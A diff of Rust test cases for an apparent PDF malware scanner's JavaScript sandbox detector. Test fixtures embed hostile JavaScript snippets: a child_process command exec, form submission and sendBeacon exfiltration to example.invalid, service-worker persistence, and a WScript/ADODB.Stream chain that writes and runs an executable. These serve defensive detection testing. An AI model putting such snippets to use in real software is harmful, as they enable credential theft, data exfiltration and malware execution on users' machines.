@@ -99,7 +99,7 @@ fn sandbox_exec_records_calls() {
     assert!(calls.contains("alert"));
     let phase_order = sandbox.meta.get("js.runtime.phase_order").expect("phase order");
     assert!(phase_order.contains("open"));
-    assert_eq!(sandbox.meta.get("js.runtime.profile_count").map(String::as_str), Some("3"));
+    assert_eq!(sandbox.meta.get("js.runtime.profile_count").map(String::as_str), Some("4"));
     assert!(sandbox.meta.contains_key("js.runtime.profile_divergence"));
     assert!(sandbox.meta.contains_key("js.runtime.profile_status"));
     assert!(sandbox.meta.contains_key("js.runtime.replay_id"));
@@ -122,14 +122,14 @@ fn sandbox_exec_demotes_confidence_when_calls_diverge_across_profiles() {
 
     let sandbox =
         report.findings.iter().find(|f| f.kind == "js_sandbox_exec").expect("sandbox exec finding");
-    assert_eq!(sandbox.confidence, Confidence::Tentative);
+    assert_eq!(sandbox.confidence, Confidence::Probable);
     assert_eq!(
         sandbox.meta.get("js.runtime.profile_consistency_signal").map(String::as_str),
         Some("calls")
     );
     assert_eq!(
         sandbox.meta.get("js.runtime.profile_consistency_ratio").map(String::as_str),
-        Some("0.33")
+        Some("0.50")
     );
     assert_eq!(
         sandbox.meta.get("js.runtime.profile_divergence").map(String::as_str),
@@ -223,8 +223,38 @@ fn sandbox_emits_downloader_loop_pattern_finding() {
 #[cfg(feature = "js-sandbox")]
 #[test]
 fn sandbox_emulation_breakpoint_tracks_loop_iteration_limit_bucket() {
-    let payload = "for (var i = 0; i < 50000; i++) { var z = i + 1; }";
+    let payload = "while (true) { var z = 1; if (z > 2) { break; } }";
     let bytes = build_minimal_js_pdf(payload);
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    if let Some(finding) = report.findings.iter().find(|f| f.kind == "js_emulation_breakpoint") {
+        assert!(finding
+            .meta
+            .get("js.emulation_breakpoint.buckets")
+            .map(|value| value.contains("loop_iteration_limit"))
+            .unwrap_or(false));
+    } else {
+        let sandbox_exec = report
+            .findings
+            .iter()
+            .find(|f| f.kind == "js_sandbox_exec")
+            .expect("js_sandbox_exec fallback finding");
+        assert!(
+            sandbox_exec.meta.get("js.runtime.execution.adaptive_loop_profile").is_some(),
+            "expected adaptive loop metadata in fallback path"
+        );
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_wasm_loader_staging_finding() {
+    let bytes = build_minimal_js_pdf(
+        "WebAssembly.Module\\('00'\\);WebAssembly.instantiate\\('00'\\);eval\\('1'\\);",
+    );
     let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
         vec![Box::new(JavaScriptSandboxDetector)];
     let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
@@ -233,11 +263,273 @@ fn sandbox_emulation_breakpoint_tracks_loop_iteration_limit_bucket() {
     let finding = report
         .findings
         .iter()
-        .find(|f| f.kind == "js_emulation_breakpoint")
-        .expect("js_emulation_breakpoint finding");
-    assert!(finding
-        .meta
-        .get("js.emulation_breakpoint.buckets")
-        .map(|value| value.contains("loop_iteration_limit"))
-        .unwrap_or(false));
+        .find(|f| f.kind == "js_runtime_wasm_loader_staging")
+        .expect("js_runtime_wasm_loader_staging finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("wasm_loader_staging")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_heap_manipulation_runtime_finding() {
+    let bytes = build_minimal_js_pdf(
+        "var b=new ArrayBuffer\\(32\\);var u=new Uint8Array\\(b\\);u.set\\([1,2,3]\\);var d=new DataView\\(b\\);d.setUint8\\(0,65\\);d.getUint8\\(0\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_heap_manipulation")
+        .expect("js_runtime_heap_manipulation finding");
+    assert_eq!(finding.meta.get("js.runtime.heap.allocation_count").map(String::as_str), Some("2"));
+    assert!(
+        finding
+            .meta
+            .get("js.runtime.heap.access_count")
+            .and_then(|value| value.parse::<usize>().ok())
+            .unwrap_or(0)
+            >= 2
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_runtime_dependency_loader_abuse_finding() {
+    let bytes = build_minimal_js_pdf(
+        "var cp=require\\('child_process'\\);cp.exec\\('cmd /c whoami'\\);var fs=require\\('fs'\\);fs.writeFileSync\\('a',\\'b\\'\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_dependency_loader_abuse")
+        .expect("js_runtime_dependency_loader_abuse finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("runtime_dependency_loader_abuse")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_credential_harvest_finding() {
+    let bytes = build_minimal_js_pdf(
+        "addField\\('email'\\);getField\\('email'\\);submitForm\\('https://example.invalid/collect'\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_credential_harvest")
+        .expect("js_runtime_credential_harvest finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("credential_harvest_form_emulation")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_service_worker_persistence_finding() {
+    let bytes = build_minimal_js_pdf(
+        "navigator.serviceWorker.register\\('/sw.js'\\);navigator.serviceWorker.getRegistrations\\(\\);self.addEventListener\\('fetch',function\\(\\)\\{\\}\\);caches.open\\('v1'\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_service_worker_persistence")
+        .expect("js_runtime_service_worker_persistence finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("service_worker_persistence_abuse")
+    );
+    assert_eq!(
+        finding
+            .meta
+            .get("js.runtime.behavior.meta.js.runtime.service_worker.registration_calls")
+            .map(String::as_str),
+        Some("1")
+    );
+    assert_eq!(
+        finding
+            .meta
+            .get("js.runtime.behavior.meta.js.runtime.service_worker.event_handlers_registered")
+            .map(String::as_str),
+        Some("1")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_webcrypto_key_staging_finding() {
+    let bytes = build_minimal_js_pdf(
+        "crypto.subtle.generateKey\\('AES'\\);crypto.subtle.exportKey\\('raw'\\);navigator.sendBeacon\\('https://example.invalid',\\'blob\\'\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_webcrypto_key_staging")
+        .expect("js_runtime_webcrypto_key_staging finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("webcrypto_key_staging_exfil")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_modern_fingerprint_evasion_finding() {
+    let bytes = build_minimal_js_pdf(
+        "navigator.userAgentData.getHighEntropyValues\\(['platform'\\]\\);permissions.query\\({name:'notifications'}\\);WebGLRenderingContext.getParameter\\(37445\\);AudioContext.createAnalyser\\(\\);setTimeout\\(function\\(\\)\\{\\},1\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_modern_fingerprint_evasion")
+        .expect("js_runtime_modern_fingerprint_evasion finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("modern_fingerprint_evasion")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_chunked_data_exfil_finding() {
+    let bytes = build_minimal_js_pdf(
+        "var parts=[];parts.push\\('AA'\\);parts.push\\('BB'\\);var p=btoa\\(parts.join\\(''\\)\\);navigator.sendBeacon\\('https://example.invalid/a',p\\);navigator.sendBeacon\\('https://example.invalid/b',p\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_chunked_data_exfil")
+        .expect("js_runtime_chunked_data_exfil finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("chunked_data_exfil_pipeline")
+    );
+    assert!(finding.meta.contains_key("js.runtime.behavior.meta.taint_edges"));
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_interaction_coercion_finding() {
+    let bytes = build_minimal_js_pdf(
+        "alert\\('Enable content to continue'\\);confirm\\('Please allow now'\\);prompt\\('Retry to continue'\\);setTimeout\\(function\\(\\)\\{\\},1\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_interaction_coercion")
+        .expect("js_runtime_interaction_coercion finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("interaction_coercion_loop")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_lotl_api_chain_execution_finding() {
+    let bytes = build_minimal_js_pdf(
+        "var shell=WScript.CreateObject\\('WScript.Shell'\\);shell.ExpandEnvironmentStrings\\('%TEMP%'\\);var stream=WScript.CreateObject\\('ADODB.Stream'\\);stream.Open\\(\\);stream.Write\\('MZ'\\);stream.SaveToFile\\('C:\\\\\\\\Temp\\\\\\\\x.bin',2\\);shell.Run\\('C:\\\\\\\\Temp\\\\\\\\x.bin',0,false\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_lotl_api_chain_execution")
+        .expect("js_runtime_lotl_api_chain_execution finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("lotl_api_chain_execution")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_pr19_behavioural_resilience_findings() {
+    let payload = "var src=getField\\('name'\\);var a=String.fromCharCode\\(97,108,101,114,116\\);var b=String.fromCharCode\\(40,49,41\\);var staged=a.concat\\(b\\);eval\\(staged\\);";
+    let bytes = build_minimal_js_pdf(payload);
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    for kind in [
+        "js_runtime_api_sequence_malicious",
+        "js_runtime_source_sink_complexity",
+        "js_runtime_dynamic_string_materialisation",
+    ] {
+        assert!(
+            report.findings.iter().any(|finding| finding.kind == kind),
+            "missing expected PR-19 finding kind {kind}"
+        );
+    }
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_marks_oversized_payload_as_skipped() {
+    let large_payload = "a".repeat(300_000);
+    let bytes = build_minimal_js_pdf(&large_payload);
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_sandbox_skipped")
+        .expect("js_sandbox_skipped finding");
+    assert_eq!(finding.meta.get("js.sandbox_exec").map(String::as_str), Some("false"));
+    assert_eq!(
+        finding.meta.get("js.sandbox_skip_reason").map(String::as_str),
+        Some("payload_too_large")
+    );
+    assert_eq!(finding.meta.get("js.runtime.profile_skipped_count").map(String::as_str), Some("4"));
 }
